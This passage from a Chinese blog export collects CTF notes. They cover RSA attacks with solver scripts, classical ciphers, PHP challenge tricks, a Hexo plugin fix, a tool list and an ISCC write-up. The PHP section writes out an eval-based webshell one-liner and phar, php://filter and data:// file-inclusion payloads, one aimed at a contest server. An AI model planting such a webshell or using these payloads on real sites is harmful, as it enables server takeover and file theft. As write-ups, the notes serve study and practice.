908563699707272843032773107477368790419109907271096351457526240471975122296483655337150130000812813081239181653384419149292970320991892073352340649237387406498087734708162094476092368665794350968924289259192893289337038201504066310173284757044802449600666007821509553,8597067880812456123669594978660135058668875834924201279924162761020137582662367704504988576614934966062323191666982943113656186783894245035267051756178331490881264629774635620179678000947771928854566239213498586078670870127924696459041295848474073879336501325437194563845414699360564571136683492426292766799121155041276162673427700999761055592609213603158576637212003771003996722743170543342885011289692845493598413965688949325670519743413071479057382602222055902593614159427186017797992219490308930116850084553033461316509457834436420821916094206010206229370273622681413176347187252950087428868295965528772832409316]data=[]for i in range(len(c): data += [(c[i],n[i])]x, n = chinese_remainder_theorem(data)realnum = gmpy.mpz(x).root(e)[0].digits()print my_parse_number(int(realnum))#When e are small and same,it can be Hastad's broadcast attack.Maybe we won't have topic aboout RSA,but I wish you can explore it Non-stop.hctf&#123;Hastad's_broadcast_attack_is_interesting&#125; 低解密指数攻击 与低加密指数相同，低解密指数可以加快解密的过程，但是者也带来了安全问题。Wiener表示如果满足： \[ d&lt;\frac{1}{3}n^\frac{1}{4} \] 那么一种基于连分数(一个数论当中的问题)的特殊攻击类型就可以危害RSA的安全。此时需要满足： \[ q&lt;p&lt;2q \] 如果满足上述条件，通过Wiener Attack可以在多项式时间中分解n。 rsa-wiener-attack的攻击源码开源在了github中，采取python编写，可以很容易使用。 识别 非常简单，e看起来很大就行了。 例题 直接github用工具就行。https://github.com/pablocelayes/rsa-wiener-attack 这里注意一个细节问题，如果在运行脚本的时候报错，请在脚本前加上： 12import syssys.setrecursionlimit(10000000) 提供enc和pem文件 例题 RSA 使用openssl得到public.pem的n和e 123openssl rsa -text -modulus -pubin -in public.pemExponent: 65537 (0x10001)Modulus=A41006DEFD378B7395B4E2EB1EC9BF56A61CD9C3B5A0A73528521EEB2FB817A7 利用gmpy2算出其他值，并使用pycryptodome模块导出private.pem 123456789101112from Crypto.PublicKey import RSAimport gmpy2n = gmpy2.mpz(74207624142945242263057035287110983967646020057307828709587969646701361764263)p = gmpy2.mpz(258631601377848992211685134376492365269)q = gmpy2.mpz(286924040788547268861394901519826758027)e = gmpy2.mpz(65537)d = gmpy2.invert(e, (p - 1) * (q - 1))with open("private.pem", "wb") as file: privateKey = RSA.construct((int(n), int(e), int(d), int(p), int(q))) file.write(privateKey.exportKey()) 最后使用openssl解密flag.enc 1openssl rsautl -decrypt -in flag.enc -inkey private.pem -out flag.dec 共模攻击 如果在RSA的使用中使用了相同的模n对相同的明文m进行了加密，那么就可以在不分解n的情况下还原出明文m的值。 即： \[ c_1 \equiv m^{e_1}\ mod\ n \] \[ c_2 \equiv m^{e_2}\ mod\ n \] 此时不需要分解n，不需要求解私钥，如果两个加密指数互素，就可以通过共模攻击在两个密文和公钥被嗅探到的情况下还原出明文m的值。 过程如下，首先两个加密指数互质，则： \[ (e_1,e_2)=1 \] 即存在\(s_1,s_2\)使得： \[ s_1e_1+s_2e_2=1 \] 又因为： \[ c_1 \equiv m^{e_1}\ mod\ n \] \[ c_2 \equiv m^{e_2}\ mod\ n \] 通过代入化简可以得出： \[ c_1^{s_1}c_2^{s_2} \equiv m\ mod\ n \] 明文解出。 例题 Jarvis very hard rsa 题目给了一个N，两个不同的e，猜到是共模攻击 解密脚本 12345678910111213141516171819import gmpy2n = 0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929c1 = int(open('flag.enc1', 'rb').read().encode('hex'),16)c2 = int(open('flag.enc2', 'rb').read().encode('hex'),16)e1 = 17e2 = 65537s = gmpy2.gcdext(e1,e2) # gmpy2自带欧几里得以及扩展欧几里得算法s1 = s[1]s2 = s[2]if s1&lt;0: s1 = - s1 c1 = gmpy2.invert(c1, n)elif s2&lt;0: s2 = - s2 c2 = gmpy2.invert(c2, n)m = gmpy2.powmod(c1, s1, n) * gmpy2.powmod(c2, s2, n) % nprint hex(m)[2:].decode('hex') tips 参考 密码学笔记-veritas CTF中RSA的常见攻击方法 \(\varphi (N)=\varphi (p)\varphi (q)=(p−1)(q−1)\)欧拉函数是积性函数，即是说若\(m\),\(n\)互质，\(\varphi (mn)=\varphi (m)\varphi (n)\)，如果\(n\)为质数，那么\(\varphi(n)=n-1\)↩︎ 同余符号\(\equiv\)：给定一个正整数n，如果两个整数a和b满足a-b能被n整除，即\((a-b)\ mod\ n=0\)，那么就称整数a与b对模n同余，记作\(a \equiv b \ (mod\ n)\)，同时可成立\(a \ mod \ n=b\)。↩︎]]></content>
      <tags>
        <tag>encrypt</tag>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF中遇到过的编码和加密]]></title>
    <url>%2F2019%2F07%2F10%2Fencrypt%2F</url>
    <content type="text"><![CDATA[栅栏密码 所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话） 一般比较常见的是2栏的栅栏密码。 比如明文：THERE IS A CIPHER 去掉空格后变为：THEREISACIPHER 两个一组，得到：TH ER EI SA CI PH ER 先取出第一个字母：TEESCPE 再取出第二个字母：HRIAIHR 连在一起就是：TEESCPEHRIAIHR 解密工具 凯撒密码 密码学中，恺撒密码（英语：Caesar cipher），或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加密技术。它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。 加密实例： 明文： The quick brown fox jumps over the lazy dog 偏移量：1 密文： Uif rvjdl cspxo gpy kvnqt pwfs uif mbaz eph 解密工具 猪圈密码 猪圈密码（亦称朱高密码、共济会暗号、共济会密码或共济会员密码），是一种以格子为基础的简单替代式密码。即使使用符号，也不会影响密码分析，亦可用在其它替代式的方法。 猪圈密码 示例 维吉尼亚密码 维吉尼亚密码（又译维热纳尔密码）是使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单形式 密码表 明文： THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG 密钥(循环使用，密钥越长相对破解难度越大)： CULTURE 加密过程：如果第一行为明文字母，第一列为密钥字母，那么明文字母'T'列和密钥字母'C'行的交点就是密文字母'V'，以此类推。 密文： VBP JOZGM VCHQE JQR UNGGW QPPK NYI NUKR XFK 已知密钥 解密工具 未知密钥 破解维吉尼亚密码第一步是确定密钥长度，维吉尼亚密码分析这篇文章里介绍了使用 重合指数 算法来确定密钥长度，在确定密钥长度后就可以尝试确定密钥，通常我们可以使用 卡方检验 来找到每个字母的偏移量，基于维吉尼亚密码分析一文中的算法实现的工具破解示例。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from ngram_score import ngram_scorefrom pycipher import Vigenereimport refrom itertools import permutationsqgram = ngram_score('quadgrams.txt')trigram = ngram_score('trigrams.txt')ctext = 'kiqpbkxspshwehospzqhoinlgapp'ctext = re.sub(r'[^A-Z]','',ctext.upper())# keep a list of the N best things we have seen, discard anything elseclass nbest(object): def __init__(self,N=1000): self.store = [] self.N = N def add(self,item): self.store.append(item) self.store.sort(reverse=True) self.store = self.store[:self.N] def __getitem__(self,k): return self.store[k] def __len__(self): return len(self.store)#initN=100for KLEN in range(3,20): rec = nbest(N) for i in permutations('ABCDEFGHIJKLMNOPQRSTUVWXYZ',3): key = ''.join(i) + 'A'*(KLEN-len(i)) pt = Vigenere(key).decipher(ctext) score = 0 for j in range(0,len(ctext),KLEN): score += trigram.score(pt[j:j+3]) rec.add((score,''.join(i),pt[:30])) next_rec = nbest(N) for i in range(0,KLEN-3): for k in xrange(N): for c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ': key = rec[k][1] + c fullkey = key + 'A'*(KLEN-len(key)) pt = Vigenere(fullkey).decipher(ctext) score = 0 for j in range(0,len(ctext),KLEN): score += qgram.score(pt[j:j+len(key)]) next_rec.add((score,key,pt[:30])) rec = next_rec next_rec = nbest(N) bestkey = rec[0][1] pt = Vigenere(bestkey).decipher(ctext) bestscore = qgram.score(pt) for i in range(N): pt = Vigenere(rec[i][1]).decipher(ctext) score = qgram.score(pt) if score &gt; bestscore: bestkey = rec[i][1] bestscore = score print bestscore,'Vigenere, klen',KLEN,':"'+bestkey+'",',Vigenere(bestkey).decipher(ctext) 培根密码 加密时，明文中的每个字母都会转换成一组五个英文字母。其转换依靠下表： A/a aaaaa H/h aabbb O/o abbba V/v babab B/b aaaab I/i abaaa P/p abbbb W/w babba C/c aaaba J/j abaab Q/q baaaa X/x babbb D/d aaabb K/k ababa R/r baaab Y/y bbaaa E/e aabaa L/l ababb S/s baaba Z/z bbaab F/f aabab M/m abbaa T/t baabb G/g aabba N/n abbab U/u babaa 加密者需使用两种不同字体，分别代表A和B。准备好一篇包含相同AB字数的假信息后，按照密文格式化假信息，即依密文中每个字母是A还是B分别套用两种字体。 解密时，将上述方法倒转。所有字体一转回A，字体二转回B，以后再按上表拼回字母。 法兰西斯·培根另外准备了一种方法，其将大小写分别看作A与B，可用于无法使用不同字体的场合（例如只能处理纯文本时）。但这样比起字体不同更容易被看出来，而且和语言对大小写的要求也不太兼容。 培根密码本质上是将二进制信息通过样式的区别，加在了正常书写之上。培根密码所包含的信息可以和用于承载其的文章完全无关。 明文： T H E F O X 密文： baaba aabbb aabaa aabab abbab babab 解密工具 jjencode/aaencode jjencode代码，就是将正常的js代码转换成复杂的只有符号的字符串编码， 进行加密 如：[$._$_]+$._$+",\\"+$.$__+$.___+"\\"+$.__$+$.__$+$这样的组合。 aaencode代码，则是将正常的js代码转为好玩的特殊网络表情符号。 如:ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ ['_']; o=(ﾟｰﾟ) 这样的表情文字. 解密方式：直接在浏览器F12开发人员工具中的控制台中输入密文执行即可 JSfuck encode JavaScript with only 6 letters - !+ 解密工具 brainfuck/ook Brainfuck是一种极小化的计算机语言，按照"Turing complete（完整图灵机）"思想设计的语言，它的主要设计思路是：用最小的概念实现一种“简单”的语言，BrainF**k 语言只有八种符号，所有的操作都由这八种符号( &gt; &lt; + - . , [ ] )的组合来完成。 Ook! 与Brainfuck类似, 但用单词“Ook！”，“Ook.” 和“Ook?”代替。 解密工具 参考：CTF中那些脑洞大开的编码和加密]]></content>
      <tags>
        <tag>encrypt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF中的php套路]]></title>
    <url>%2F2019%2F07%2F09%2Fphp%2F</url>
    <content type="text"><![CDATA[MD5() ==判断 PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 ===判断 MD5不能处理数组，构造?a[]=1&amp;b[]=2这样md5函数无法处理数组返回false完成匹配得到flag。 strcmp 如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0； 如果两者相等，返回 0。 5.2 中是将两个参数先转换成string类型。 5.3.3 以后，当比较数组和字符串的时候，返回是0。 5.5 中如果参数不是string类型，直接return了 php伪协议 php://input 123index.php?file=php://inputPOST:&lt;? phpinfo(); ?&gt; php://filter 可以读取本地文件 index.php?file=php://filter/read=convert.base64-encode/resource=index.php 指定末尾文件，可以读到base64编码后的文件内容，ctf中常有题目可读文件源码。 如果不使用php://filter，要读取的文件扩展名是php的话，会直接解析，而不会显示出来内容 php://phar 绕过上传限制 新建一个test.php，写入一句话 12//test.php&lt;?php @eval($_POST["cmd"]);?&gt; 将其压缩，后缀名改为.jpg。 然后使用phar协议读取文件。 1/index.php?page=phar://test.jpg/test.php 例题 安恒11月赛：image_up 1http://101.71.29.5:10007/index.php?page=php://filter/read=convert.base64-encode/resource= 读取到以下文件源码 index.php 1234567891011&lt;?php if(isset($_GET['page']))&#123; if(!stristr($_GET['page'],".."))&#123; $page = $_GET['page'].".php"; include($page); &#125;else&#123; header("Location: index.php?page=login"); &#125; &#125;else&#123; header("Location: index.php?page=login"); &#125; login.php 123456&lt;?php if(isset($_POST['username'])&amp;&amp;isset($_POST['password']))&#123; header("Location: index.php?page=upload"); exit(); &#125;?&gt; upload.php 123456789101112131415161718192021222324&lt;?php $error = ""; $exts = array("jpg","png","gif","jpeg"); if(!empty($_FILES["image"])) &#123; $temp = explode(".", $_FILES["image"]["name"]); $extension = end($temp); if((@$_upfileS["image"]["size"] &lt; 102400)) &#123; if(in_array($extension,$exts))&#123; $path = "uploads/".md5($temp[0].time()).".".$extension; move_uploaded_file($_FILES["image"]["tmp_name"], $path); $error = "上传成功!"; &#125; else&#123; $error = "上传失败！"; &#125; &#125;else&#123; $error = "文件过大，上传失败！"; &#125; &#125;?&gt; upload.php限制了上传文件类型，只能为"jpg","png","gif","jpeg"，使用phar伪协议绕过即可。 payload: 1/index.php?page=phar://./uploads/6b19a5399b7d34fbb3c509ca8c25fd89.jpg/shell 因为index.php中会为请求的页面自动加上.php后缀，所以构造的payload不能写.php后缀。 phar反序列化 参考利用 phar 拓展 php 反序列化漏洞攻击面 data:// 12index.php?file=data:text/plain,&lt;?php phpinfo(); ?&gt;%00index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b 变量覆盖漏洞 全局变量覆盖 条件：register_globals = ON 4.2.0后默认关闭 5.4.0后已移除 例题： 12345678910111213&lt;?php error_reporting(0);include "flag1.php";highlight_file(__file__);if(isset($_GET['args']))&#123; $args = $_GET['args']; if(!preg_match("/^\w+$/",$args))&#123; die("args error!"); &#125; eval("var_dump($$args);");&#125;?&gt; payload:/index1.php?args=GLOBALS 因为有eval("var_dump($$args);"); 直接用全局变量打印所有字符串即可得到flag $$导致的变量覆盖问题 $$ 导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出现，如以下的示例代码，使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。请求?name=test 会将$name的值覆盖，变为test。 1234567891011121314151617&lt;?php //?name=test //output:string(4) “name” string(4) “test” string(4) “test” test $name=’thinking’; foreach ($_GET as $key =&gt; $value) &#123; $$key = $value; &#125; var_dump($key); var_dump($value); var_dump($$key); echo $name;?&gt; 例题： 题目源码： 123456789101112131415161718192021222324252627282930&lt;?php include “flag.php”; $_403 = “Access Denied”; $_200 = “Welcome Admin”; if ($_SERVER["REQUEST_METHOD"] != “POST”) &#123; die(“BugsBunnyCTF is here :p…”); &#125; if ( !isset($_POST["flag"]) ) &#123; die($_403); &#125; foreach ($_GET as $key =&gt; $value) &#123; $$key = $$value; &#125; foreach ($_POST as $key =&gt; $value) &#123; $$key = $value; &#125; if ( $_POST["flag"] !== $flag ) &#123; die($_403); &#125; echo “This is your flag : “. $flag . “\n”; die($_200);?&gt; 题目分析： 源码包含了flag.php文件，并且需要满足3个if里的条件才能获取flag，题目中使用了两个foreach并且也使用了$$两个foreach中对$$key的处理是不一样的，满足条件后会将$flag里面的值打印出来，所以$flag是在flag.php文件文件中的。 但是由于第7，11-14行间的代码会将flag的值给覆盖掉了，所以需要先将flag的值给覆盖掉了，所以需要先将flag的值赋给200或200或_403变量，然后利用die(200)或die(200)或die(_403)将flag打印出来。 解题方法： 由于第7，11-14行间的代码会将$flag的值给覆盖掉，所以只能利用第一个foreach先将$flag的值赋给$_200，然后利用die($_200)将原本的flag值打印出来。 最终PAYLOAD： 123GET DATA：?_200=flag POST DATA：flag=aaaaaaaaaaaaaaaaaaaaa extract()函数导致的变量覆盖问题 extract()该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 extract()的用法参考：http://www.runoob.com/php/func-array-extract.html 语法： extract(array,extract_rules,prefix) 例题： 题目源码： 12345678910111213141516&lt;?php$flag = ‘xxx’;extract($_GET);if (isset($gift)) &#123;$content = trim(file_get_contents($flag));if ($gift == $content) &#123;echo ‘hctf&#123;…&#125;’;&#125; else &#123;echo ‘Oh..’;&#125;&#125; ?&gt; 题目分析： 题目使用了extract($_GET)接收了GET请求中的数据，并将键名和键值转换为变量名和变量的值，然后再进行两个if 的条件判断，所以可以使用GET提交参数和值，利用extract()对变量进行覆盖，从而满足各个条件。 解题方法： GET请求 ?flag=&amp;gift=，extract()会将flag和flag和gift的值覆盖了，将变量的值设置为空或者不存在的文件就满足gift==gift==content。 最终PAYLOAD： 1GET DATA： ?flag=&amp;gift= parse_str函数导致的变量覆盖问题 parse_str() 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。 语法：parse_str(string,array) 题目源码： 12345678910111213141516171819202122232425&lt;?php error_reporting(0); if (empty($_GET['id'])) &#123; show_source(__FILE__); die(); &#125; else &#123; include (‘flag.php’); $a = “www.OPENCTF.com $id = $_GET['id']; @parse_str($id); if ($a[0] != ‘QNKCDZO’ &amp;&amp; md5($a[0]) == md5(‘QNKCDZO’)) &#123; echo $flag; &#125; else &#123; exit(‘其实很简单其实并不难！’); &#125; &#125;?&gt; 题目分析： 首先要求使用GET提交id参数，然后parse_str($id)对id参数的数据进行处理，再使用判断a[0] != ‘QNKCDZO’ &amp;&amp; md5(a[0] != ‘QNKCDZO’ &amp;&amp; md5(a[0]) == md5(‘QNKCDZO’)的结果是否为真，为真就返回flag，md5(‘QNKCDZO’)的结果是0e830400451993494058024219903391由于此次要满足a[0] != ‘QNKCDZO’ &amp;&amp; md5(a[0] != ‘QNKCDZO’ &amp;&amp; md5(a[0]) == md5(‘QNKCDZO’)所以要利用php弱语言特性，0e123会被当做科学计数法，0 * 10 x 123。所以需要找到一个字符串md5后的结果是0e开头后面都是数字的，如，240610708，s878926199a PHP处理0e开头md5哈希字符串缺陷/bug 参考：http://www.cnblogs.com/Primzahl/p/6018158.html 解题方法： 使用GET请求id=a[0]=240610708，这样会将a[0]的值覆盖为240610708，然后经过md5后得到0e462097431906509019562988736854与md5(‘QNKCDZO’)的结果0e830400451993494058024219903391比较都是0 所以相等，满足条件，得打flag。 最终PAYLOAD： 1234567GET DATA:?id=a[0]=s878926199aor?id=a[0]=240610708]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用hexo-asset-image图片路径错误]]></title>
    <url>%2F2019%2F07%2F01%2Fhexo-image%2F</url>
    <content type="text"><![CDATA[Part 1 今天提交文章的时候，上去博客看了一眼，发现图片全都显示不出来， 看了下图片url，全都是 1file://image/123.jpg 这种形式的。 因为我使用的typora来写markdown，自动插入图片默认的是本地路径，去设置里更改为使用相对路径即可 part 2 原本以为大功告成，结果发现还是显示错误，去网上查了下，有些插件没有装，_config.yml里的选项也没有开。。。 安装hexo-asset-image 1npm install https://github.com/CodeFalling/hexo-asset-image --save _config.yml配置 post_asset_folder: false改为post_asset_folder: true part 3 再次以为大功告成，结果发现还是错误，之前hexo g -d 的时候没有注意，这次执行的时候突然发现有几条记录有点奇怪 12update link as:--&gt;/.io//06/01/vim/1561905818946.pngupdate link as:--&gt;/.io//06/01/vim/1561905818946.png 这个.io不知道是怎么来的，不管怎么修改图片的路径，这个.io总是有 最终查来查去发现是hexo-asset-image这个插件的问题，hexo 3.0以上与hexo 3.0以下获取url的方式不同，结果就导致获取到了.io这种奇怪的域名。 解决问题 参考hexo引用本地图片无法显示 将/node_modules/hexo-asset-image/index.js里面的内容修改为 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061'use strict';var cheerio = require('cheerio');// http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-stringfunction getPosition(str, m, i) &#123; return str.split(m, i).join(m).length;&#125;var version = String(hexo.version).split('.');hexo.extend.filter.register('after_post_render', function(data)&#123; var config = hexo.config; if(config.post_asset_folder)&#123; var link = data.permalink; if(version.length &gt; 0 &amp;&amp; Number(version[0]) == 3) var beginPos = getPosition(link, '/', 1) + 1; else var beginPos = getPosition(link, '/', 3) + 1; // In hexo 3.1.1, the permalink of "about" page is like ".../about/index.html". var endPos = link.lastIndexOf('/') + 1; link = link.substring(beginPos, endPos); var toprocess = ['excerpt', 'more', 'content']; for(var i = 0; i &lt; toprocess.length; i++)&#123; var key = toprocess[i]; var $ = cheerio.load(data[key], &#123; ignoreWhitespace: false, xmlMode: false, lowerCaseTags: false, decodeEntities: false &#125;); $('img').each(function()&#123; if ($(this).attr('src'))&#123; // For windows style path, we replace '\' to '/'. var src = $(this).attr('src').replace('\\', '/'); if(!/http[s]*.*|\/\/.*/.test(src) &amp;&amp; !/^\s*\//.test(src)) &#123; // For "about" page, the first part of "src" can't be removed. // In addition, to support multi-level local directory. var linkArray = link.split('/').filter(function(elem)&#123; return elem != ''; &#125;); var srcArray = src.split('/').filter(function(elem)&#123; return elem != '' &amp;&amp; elem != '.'; &#125;); if(srcArray.length &gt; 1) srcArray.shift(); src = srcArray.join('/'); $(this).attr('src', config.root + link + src); console.info&amp;&amp;console.info("update link as:--&gt;"+config.root + link + src); &#125; &#125;else&#123; console.info&amp;&amp;console.info("no src attr, skipped..."); console.info&amp;&amp;console.info($(this)); &#125; &#125;); data[key] = $.html(); &#125; &#125;&#125;); 接着再去hexo g -d一下就能显示成功了。 hexo 3.0以上用户应该也可以选择直接卸载hexo-asset-image插件，直接使用官方的相对路径引用的标签插件 资源文件夹 通过常规的 markdown 语法和相对路径来引用图片和其它资源可能会导致它们在存档页或者主页上显示不正确。在Hexo 2时代，社区创建了很多插件来解决这个问题。但是，随着Hexo 3 的发布，许多新的标签插件被加入到了核心代码中。这使得你可以更简单地在文章中引用你的资源。 比如说：当你打开文章资源文件夹功能后，你把一个 example.jpg 图片放在了你的资源文件夹中，如果通过使用相对路径的常规 markdown 语法 ![](/example.jpg) ，它将 不会 出现在首页上。（但是它会在文章中按你期待的方式工作） 正确的引用图片方式是使用下列的标签插件而不是 markdown ： 通过这种方式，图片将会同时出现在文章和主页以及归档页中。]]></content>
      <tags>
        <tag>hexo</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常用CTF工具收集]]></title>
    <url>%2F2019%2F06%2F29%2Ftools%2F</url>
    <content type="text"><![CDATA[Binary Tool Description radare2 开源逆向框架 pwntools CTF框架和漏洞利用(exploit)编写工具 jd-gui java反编译 libc-database 根据偏移查找libc版本并下载 LibcSearcher 根据泄露出来的libc中的函数的地址来查找libc版本 Misc Tool Description z3-solver z3是由微软公司开发的一个优秀的SMT求解器，它能够检查逻辑表达式的可满足性。 Web Tool Description dirsearch 目录爆破 Crypto Tool Description RSAtool RSA加解密工具 yafu 分解大整数 gmpy2 高精度算术运算库 pycryptodome Cryptographic library for Python Mobile Tool Description APK改之理 Android反编译工具]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ISCC 2019 Writeup]]></title>
    <url>%2F2019%2F06%2F22%2FISCC%2F</url>
    <content type="text"><![CDATA[其实是ISCC 2018 REVERSE 去网上搜flag时发现是2018原题 首先IDA打开发现UPX壳，使用UPX -d脱壳，然后放进IDA里面看源码 1561907160841 有点不忍直视，放弃，直接放进OD里面跑。 调试了几次，摸清了大致流程： 接收字符串 根据接收到的字符串打印出来东西 然后打印出来的东西本身是在程序里存着，像这样： 把这些数据拿出来转成字符串就是这种： 12666f72 495343 5f6172 696375 746869 6e6773 617379 696666 437b41 6c747d 5f6265 6c6c5f 655f64 68657965for ISC _ar icu thi ngs asy iff C&#123;A lt&#125; _be ll_ e_d heye 输入-&gt;输出规律： 123456789101112131415161 -&gt; for2 -&gt; ISC3 -&gt; _ar4 -&gt; icu 5 -&gt; thi6 -&gt; ngs7 -&gt; iff 8 -&gt; _ar9 -&gt; C&#123;A10-&gt; lt&#125;11-&gt; _be12-&gt; ll13-&gt; e_d14-&gt; hey15-&gt; e_t16-&gt; e_e 接着拼出flag-&gt;ISCC{All_things_are_easy_before_they_are_difficult}，翻译一下是凡事必先易后难，但是也可以拼成All_things_are_difficult_before_they_are_easy(凡事必先难后易)，不是很懂出题人在想什么，卡拉赞毕业打卡拉赞 MISC 依旧是原题，只不过看2018的wp貌似是个gif，每帧都是不同的二维码，而这次直接弄了一堆到文件夹里 抄下网上的wp 二维码要求在两个大黑框之间必须有连续的黑白点，这样才行 逐帧分析gif，发现只有第62帧存在一个校正图形 ，保存补上位置探测图形和定位图形 ，扫描得到ISRDQzgxMDI=，base64解码得到!$CC8102 嗦不粗话，连flag都没换 MOBILE 原题，最大的收获是找到了不少好用的工具 放入APKIDE中打开，查看AndroidManifest.xml，看到启动类为com.example.shellapplication.WrapperApplication 123456789101112public class WrapperApplication extends Application&#123; static &#123; System.loadLibrary("reinforce"); &#125; public native void attachBaseContext(Context paramContext); public native void onCreate();&#125; 这个类加载了libreinforce.so，接着去看onCreate()和attachBaseContext中的内容 onCreate： 123456789101112131415v2 = a2;v3 = a1;v4 = (*(int (**)(void))(*(_DWORD *)a1 + 24))();v5 = v4;v6 = _JNIEnv::GetMethodID(v3, v4, "getPackageName", "()Ljava/lang/String;");v7 = _JNIEnv::CallObjectMethod(v3, v2, v6);v8 = (*(int (__fastcall **)(int, int, _DWORD))(*(_DWORD *)v3 + 676))(v3, v7, 0);_android_log_print(4, "TTT", "shellapplication's onCreate execute");memset(&amp;v12, 0, 0x100u);sprintf(&amp;v12, "/data/data/%s/lib/libcore.so", v8);v9 = dlopen(&amp;v12, 1);v10 = (void (__fastcall *)(int))dlsym(v9, "resume");v10(v3);_JNIEnv::DeleteLocalRef(v3, v7);return _JNIEnv::DeleteLocalRef(v3, v5); onCreate中加载了libcore.so以及调用了resume这个方法 attachBaseContext： 12345678910memset(&amp;v23, 0, 0x100u);sprintf(&amp;v23, "%s/protected.jar", v17);extractJar(v4, v5, &amp;v23);byte_601C = (unsigned int)dalvikOrArt();memset(&amp;v24, 0, 0x100u);sprintf(&amp;v24, "%s/origin.dex", v17);decryptJar(&amp;v23, &amp;v24);v22 = v4;memset(&amp;v25, 0, 0x100u);sprintf(&amp;v25, "%s/protected.so", v17); attachBaseContext中最关键的部分是对assets中的 protected.jar进行解密，解密操作很简单，按位取反 decryptJar： 12345while ( v9 &lt; v6 ) &#123; *((_BYTE *)v8 + v9) = ~*((_BYTE *)v7 + v9); ++v9; &#125; 解密脚本： 123456789101112131415#include &lt;stdio.h&gt;int main()&#123; FILE* fi, * fo; fo = fopen("dec.dex", "wb"); fi = fopen("protected.jar", "rb"); char fBuffer[1]; while (!feof(fi)) &#123; fread(fBuffer, 1, 1, fi); // 读取1字节 if (!feof(fi)) &#123; *fBuffer =~ *fBuffer; // xor encrypt fwrite(fBuffer, 1, 1, fo); // 写入文件 &#125; &#125;&#125; 之所以为什么用C来写。。。因为python按位取反之后返回的是int类型，而负数又没办法to_bytes()，写了半天也没写出来一个比较优雅的exp，放弃。 解密之后得到一个dex文件，使用dex2jar将其转成jar文件，使用jd-gui打开。 onCreate中调用ProtectedClass的verifyKey对输入进行检查： 12345if (ProtectedClass.verifyKey(inputText.getText().toString())) &#123; str = "密码正确"; &#125; else &#123; str = "密码错误"; &#125; ProtectedClass的逻辑： 123456789public class ProtectedClass &#123; private static int[][] key = &#123; &#123; 17, 12, 3 &#125;, &#123; 21, 12, 9 &#125;, &#123; 17, 14, 6 &#125; &#125;; private static native String getEncrypttext(String paramString); public static String getString() &#123; return "bfs-iscc"; &#125; public static boolean verifyKey(String paramString) &#123; return (paramString.length() % 3 != 0) ? false : "OYUGMCH&gt;YWOCBXF))9/3)YYE".equals(getEncrypttext(paramString)); &#125;&#125; 将输入进行加密之后与OYUGMCH&gt;YWOCBXF进行比较，但是关键的getEncrypttext函数又是个native。 之前libreinforce.so中，在加载完libcore.so后，还调用了其中的resume方法 resume： 12345678910111213141516171819202122v1 = a1;v5 = 0;v6 = 0;v7 = 0;v2 = dalvikOrArt();decryptAndParse((int)&amp;v5);getSdkint(v1);if ( v2 ) resumeArt(v1, &amp;v5);else resumeDalvik((int)v1, &amp;v5);v3 = (char *)v5;v4 = v6;while ( v3 != (char *)v4 )&#123; sub_539C(v3 + 8); sub_539C(v3 + 4); sub_539C(v3); v3 += 16;&#125;if ( v5 ) operator delete(v5); 什么都看不出来。 看大佬的博客里面说使用了一个安卓的热补丁修复机制。 关于热补丁机制的描述是这样的： 在不进行版本更新的情况下，动态的屏蔽掉程序原来存在BUG的函数，使用新的函数替代。 新函数一般存在于另一个so中 热补丁的流程主要有： 通过函数名找到原来函数的地址偏移（ArtMethod-&gt;dex_code_item_offset_）。 